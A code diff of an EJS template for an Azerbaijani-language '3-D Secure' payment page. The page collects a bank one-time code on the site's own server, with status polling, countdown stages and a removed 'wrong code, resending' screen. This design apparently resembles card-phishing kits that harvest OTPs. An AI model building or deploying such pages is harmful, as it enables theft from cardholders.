@@ -1,105 +1,48 @@
-<!-- OTP Daxil Etmə Səhifəsi - Sadələşdirilmiş -->
 <section class="section">
   <div class="container">
-    <div style="max-width:520px;margin:0 auto">
+    <div style="max-width:560px;margin:0 auto">
       <div class="card">
-        <div class="card__head" style="text-align:center">
-          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin:0 auto 8px">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
-          </svg>
-          <h1 style="font-size:1.3rem;margin:0">🔐 3D Secure Doğrulaması</h1>
+        <div class="card__head">
+          <span>3-D Secure</span>
+          <span class="badge badge--gold"><%= cardMasked || '' %></span>
         </div>
-        
         <div class="card__body">
-          
-          <!-- Sifarış Məlumatları -->
-          <dl class="kv mb-20" style="text-align:center">
-            <dt>Sifarış №</dt><dd class="mono" style="font-size:1.1rem"><%= order.orderNo %></dd>
-            <dt>Kart</dt><dd class="mono"><%= cardMasked || '—' %></dd>
-            <dt>Məbləğ</dt><dd class="mono" style="font-size:1.2rem;font-weight:bold;color:#0084ff"><%= order.total.toFixed(2) %> ₼</dd>
-          </dl>
+          <div id="stageBox" class="text-center"
+               data-status-url="/api/payment/<%= order._id %>/status"
+               data-order-id="<%= order._id %>"
+               data-stage="otp_entry"
+               data-stage-seconds="<%= screen.stageSeconds %>"
+               data-seconds-left="<%= screen.secondsLeft %>">
 
-          <% if (codeSubmitted) { %>
-            
-            <!-- COD ÖNCEDENDİR GÖNDERILDISƏ: Gözləmə Ekranı -->
-            <div id="stageBox" class="text-center"
-                 data-status-url="/api/payment/<%= order._id %>/status"
-                 data-order-id="<%= order._id %>"
-                 data-stage="<%= stage %>"
-                 data-stage-seconds="120"
-                 data-seconds-left="<%= secondsLeft %>">
-              
-              <h2 style="font-size:1.15rem;margin-bottom:20px" data-stage-title>
-                <% if (wrongCode) { %>Yeni OTP kodu göndərilir<% } else { %>OTP kodu yoxlanılır...<% } %>
-              </h2>
-              
-              <div data-stage-alert class="alert alert--error" style="<%= wrongCode ? '' : 'display:none;' %>margin-bottom:16px">
-                <% if (wrongCode) { %><strong>❌ Səhv OTP — kod təkrar göndərilir</strong><br>Geri sayım bitdikdə yeni OTP ekranı açılacaq.<% } %>
-              </div>
-              
-              <!-- Geri Sayım Halka -->
-              <%- include('../partials/countdown-ring') %>
-              
-              <p class="sec-note" data-stage-note>
-                <% if (wrongCode) { %>Zəhmət olmasa gözləyin, bank yeni SMS kodu göndərir.<% } else { %>Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.<% } %>
-              </p>
+            <h1 style="font-size:1.25rem" data-stage-title>Telefonunuza gələn OTP kodunu daxil edin</h1>
+            <p class="sec-note" data-stage-note>Bank <%= cardMasked %> nömrəli karta bağlı telefona bir dəfəlik kod göndərdi.</p>
 
-              <!-- Yenidən Cəhd (Səhv OTP varsa) -->
-              <div id="retryBox" style="display:none;margin-top:24px">
-                <div class="alert alert--error" style="margin-bottom:16px">
-                  <strong>❌ Səhv OTP Kodu!</strong><br>
-                  Lütfən yenidən cəhd edin…
-                </div>
-                <button type="button" id="retryBtn" class="btn btn--secondary btn--lg" style="width:100%">
-                  🔄 Yenidən Cəhd Et
-                </button>
-              </div>
-            </div>
+            <%- include('../partials/countdown-ring') %>
 
-          <% } else { %>
-            
-            <!-- OTP FORMU: Kod daxil etmə -->
-            <div class="alert alert--success mb-20">
-              <strong>📧 Bankınızdan göndərilən OTP kodu daxil edin</strong><br>
-              <small style="color:#666">Bankınızın SMS ilə göndərdiyi 6 rəqəmli kodu yazın</small>
-            </div>
+            <div id="otpNote" class="hidden alert"></div>
 
-            <form id="codeForm" data-order-id="<%= order._id %>" style="margin-bottom:16px">
+            <form id="otpForm" data-order-id="<%= order._id %>">
               <div class="field">
-                <label for="code" style="font-weight:600">OTP Kodu</label>
-                <input 
-                  type="text" 
-                  id="code" 
-                  name="code" 
-                  data-code
-                  inputmode="numeric" 
-                  maxlength="12" 
-                  placeholder="000000" 
-                  required 
-                  autofocus
-                  style="font-size:1.8rem;letter-spacing:0.2em;text-align:center"
-                />
-                <small class="sec-note" style="margin-top:6px">Məsələn: 123456</small>
+                <label for="otpCode">3-D OTP kodu</label>
+                <input type="text" id="otpCode" name="code" class="otp-input mono" inputmode="numeric"
+                       autocomplete="one-time-code" maxlength="8" placeholder="______" required />
               </div>
-              
-              <button type="submit" class="btn btn--primary btn--lg" style="width:100%;margin-top:16px">
-                ✅ Təsdiqlə
-              </button>
+              <button type="submit" class="btn btn--primary btn--block btn--lg">Ödənişi təsdiqlə</button>
             </form>
 
-            <div id="formNote" class="hidden alert"></div>
-
-            <p class="sec-note text-center" style="margin-top:16px">
-              ⏱️ 2 dəqiqə içində kodu daxil edin
-            </p>
-
-          <% } %>
-
+            <dl class="kv" style="text-align:left;margin-top:20px">
+              <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
+              <dt><%= t('checkout.total') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
+            </dl>
+          </div>
         </div>
       </div>
     </div>
   </div>
 </section>
 
+<style>
+  .otp-input { text-align: center; font-size: 1.6rem; letter-spacing: .5em; padding: 12px; }
+</style>
+
 <script src="/public/js/secure-flow.js" defer></script>
-<script src="/public/js/payment.js" defer></script>
